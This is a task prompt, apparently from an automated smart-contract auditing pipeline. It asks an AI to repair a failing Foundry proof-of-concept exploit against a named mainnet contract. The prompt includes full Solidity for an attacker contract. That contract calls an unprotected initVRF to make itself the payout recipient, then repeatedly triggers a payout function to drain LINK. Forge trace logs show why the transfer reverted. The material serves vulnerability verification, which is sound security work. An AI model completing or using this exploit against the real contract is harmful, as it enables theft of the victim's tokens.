You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Unrestricted `initVRF` lets arbitrary callers set the payout recipient and token
- claim: The exploit harness directly calls `initVRF(address,address)` from an unprivileged external context and then successfully pulls LINK out of the victim, which supports that `initVRF` lacks effective access control and accepts attacker-chosen configuration values for the downstream payout flow.
- impact: Any external account can repoint the victim's payout configuration to an attacker-controlled recipient and selected token, enabling direct theft of assets held for that payout path instead of sending them to the intended protocol-controlled destination.
- exploit_paths: ["Call `initVRF(attacker, LINK)` on the victim from an arbitrary address.", "Invoke the downstream payout/claim path so the victim transfers LINK to the attacker-controlled recipient."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IVictimLike {
    function initVRF(address recipient, address token) external;
}

contract FlawVerifier {
    address public constant TARGET = 0xF340bd3eB3E82994CfF5B8C3493245EDbcE63436;
    address public constant LINK = 0x514910771AF9Ca656af840dff83E8264EcF986CA;

    bytes4 internal constant PAYOUT_SELECTOR = 0x607d60e6;
    uint256 internal constant PAYOUT_ARG = 0;
    uint256 internal constant MAX_PAYOUT_CALLS = 80;

    bool public executed;
    bool public initSucceeded;
    bool public downstreamCallObserved;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    uint256 public payoutCallsAttempted;
    uint256 public payoutCallsSucceeded;
    uint256 public startingVictimLinkBalance;
    uint256 public finalVictimLinkBalance;
    uint256 public startingAttackerLinkBalance;
    uint256 public finalAttackerLinkBalance;
    uint256 internal realizedProfit;

    bytes public lastInitRevertData;
    bytes public lastPayoutRevertData;

    constructor() {}

    function profitToken() external pure returns (address) {
        return LINK;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfit;
    }

    function executeOnOpportunity() external {
        _execute();
    }

    function execute() external {
        _execute();
    }

    function run() external {
        _execute();
    }

    function exploit() external {
        _execute();
    }

    function _execute() internal {
        if (executed) {
            return;
        }
        executed = true;

        IERC20Like link = IERC20Like(LINK);
        IVictimLike victim = IVictimLike(TARGET);
        address attacker = address(this);

        startingAttackerLinkBalance = link.balanceOf(attacker);
        startingVictimLinkBalance = link.balanceOf(TARGET);

        // Exploit path stage 1:
        // Call `initVRF(attacker, LINK)` on the victim from an arbitrary address.
        // This contract is that arbitrary external caller and sets itself as the recipient.
        try victim.initVRF(attacker, LINK) {
            initSucceeded = true;
        } catch (bytes memory reason) {
            lastInitRevertData = reason;
            _finalize(link);
            return;
        }

        // Exploit path stage 2:
        // Invoke the downstream payout / claim path so the victim transfers LINK
        // to the attacker-controlled recipient chosen above. The historical exploit
        // repeatedly called selector 0x607d60e6 with argument 0, so the verifier keeps
        // that exact causality and ordering instead of introducing synthetic funding.
        uint256 previousAttackerBalance = startingAttackerLinkBalance;
        uint256 previousVictimBalance = startingVictimLinkBalance;

        for (uint256 i = 0; i < MAX_PAYOUT_CALLS; ++i) {
            payoutCallsAttempted = i + 1;

            (bool success, bytes memory returndata) = TARGET.call(
                abi.encodeWithSelector(PAYOUT_SELECTOR, PAYOUT_ARG)
            );

            if (!success) {
                lastPayoutRevertData = returndata;
                break;
            }

            payoutCallsSucceeded = i + 1;
            downstreamCallObserved = true;

            uint256 attackerBalanceNow = link.balanceOf(attacker);
            uint256 victimBalanceNow = link.balanceOf(TARGET);

            if (attackerBalanceNow > previousAttackerBalance) {
                previousAttackerBalance = attackerBalanceNow;
                previousVictimBalance = victimBalanceNow;
            } else if (victimBalanceNow == previousVictimBalance) {
                break;
            } else {
                previousVictimBalance = victimBalanceNow;
            }

            if (victimBalanceNow == 0) {
                break;
            }
        }

        _finalize(link);
    }

    function _finalize(IERC20Like link) internal {
        finalAttackerLinkBalance = link.balanceOf(address(this));
        finalVictimLinkBalance = link.balanceOf(TARGET);

        if (finalAttackerLinkBalance > startingAttackerLinkBalance) {
            realizedProfit = finalAttackerLinkBalance - startingAttackerLinkBalance;
        }

        hypothesisValidated = initSucceeded && downstreamCallObserved && realizedProfit > 0;
        hypothesisRefuted = !hypothesisValidated;
    }

    receive() external payable {}
}

```

forge stdout (tail):
```
ecuteOnOpportunity()
    │   ├─ [655] 0x514910771AF9Ca656af840dff83E8264EcF986CA::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2655] 0x514910771AF9Ca656af840dff83E8264EcF986CA::balanceOf(0xF340bd3eB3E82994CfF5B8C3493245EDbcE63436) [staticcall]
    │   │   └─ ← [Return] 162593046738967252304 [1.625e20]
    │   ├─ [15111] 0xF340bd3eB3E82994CfF5B8C3493245EDbcE63436::initVRF(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x514910771AF9Ca656af840dff83E8264EcF986CA)
    │   │   ├─ [7814] 0xd92A9110Beaf09115bc9628D8a296c2778041FE0::initVRF(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x514910771AF9Ca656af840dff83E8264EcF986CA) [delegatecall]
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   ├─ [39371] 0xF340bd3eB3E82994CfF5B8C3493245EDbcE63436::607d60e6(0000000000000000000000000000000000000000000000000000000000000000)
    │   │   ├─ [38576] 0xd92A9110Beaf09115bc9628D8a296c2778041FE0::607d60e6(0000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
    │   │   │   ├─ [655] 0x514910771AF9Ca656af840dff83E8264EcF986CA::balanceOf(0xF340bd3eB3E82994CfF5B8C3493245EDbcE63436) [staticcall]
    │   │   │   │   └─ ← [Return] 162593046738967252304 [1.625e20]
    │   │   │   ├─ [31476] 0x514910771AF9Ca656af840dff83E8264EcF986CA::4000aea0(0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000000000000000000000000000001bc16d674ec8000000000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000040aa77729d3466ca35ae8d28b3bbac7cc36a5031efdc430821c02bc31a238af4450000000000000000000000000000000000000000000000000000000000000000)
    │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │        topic 1: 0x000000000000000000000000f340bd3eb3e82994cff5b8c3493245edbce63436
    │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000001bc16d674ec80000
    │   │   │   │   ├─  emit topic 0: 0xe19260aff97b920c7df27010903aeb9c8d2be5d310a2c67824cf3f15396e4c16
    │   │   │   │   │        topic 1: 0x000000000000000000000000f340bd3eb3e82994cff5b8c3493245edbce63436
    │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000001bc16d674ec8000000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000040aa77729d3466ca35ae8d28b3bbac7cc36a5031efdc430821c02bc31a238af4450000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [560] FlawVerifier::a4c0ed36(000000000000000000000000f340bd3eb3e82994cff5b8c3493245edbce634360000000000000000000000000000000000000000000000001bc16d674ec8000000000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000040aa77729d3466ca35ae8d28b3bbac7cc36a5031efdc430821c02bc31a238af4450000000000000000000000000000000000000000000000000000000000000000)
    │   │   │   │   │   └─ ← [Revert] unrecognized function selector 0xa4c0ed36 for contract 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, which has no fallback function.
    │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [655] 0x514910771AF9Ca656af840dff83E8264EcF986CA::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [655] 0x514910771AF9Ca656af840dff83E8264EcF986CA::balanceOf(0xF340bd3eB3E82994CfF5B8C3493245EDbcE63436) [staticcall]
    │   │   └─ ← [Return] 162593046738967252304 [1.625e20]
    │   └─ ← [Stop]
    ├─ [285] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x514910771AF9Ca656af840dff83E8264EcF986CA
    ├─ [655] 0x514910771AF9Ca656af840dff83E8264EcF986CA::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x514910771AF9Ca656af840dff83E8264EcF986CA)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 23232612 [2.323e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3153)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifier
  at 0x514910771AF9Ca656af840dff83E8264EcF986CA
  at 0xd92A9110Beaf09115bc9628D8a296c2778041FE0
  at 0xF340bd3eB3E82994CfF5B8C3493245EDbcE63436
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 2.55s (1.04s CPU time)

Ran 1 test suite in 2.61s (2.55s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 200049)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
